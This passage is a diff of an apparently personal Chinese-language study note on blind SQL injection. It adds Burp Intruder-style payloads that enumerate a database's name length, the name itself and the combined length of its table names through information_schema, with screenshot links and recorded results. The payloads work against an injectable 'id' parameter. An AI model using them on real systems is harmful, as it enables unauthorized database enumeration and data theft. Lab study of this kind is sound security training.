@@ -1088,4 +1088,14 @@ dump
 id=1'+and+length(database())%3d§1§%23
 ```
 ![[Pasted image 20240329131949.png]]
-爆数据库名：
+爆数据库名 为 hazel
+```
+id=1'+and+substr(database(),§1§,1)%3d'§1§'%23
+```
+![[Pasted image 20240329132535.png]]
+爆表名总长度 为 7
+```
+id=1'+and+length((select+group_concat(table_name)+from+information_schema.tables+where+table_schema%3ddatabase()))%3d§1§%23
+```
+![[Pasted image 20240329132859.png]]
+爆表名
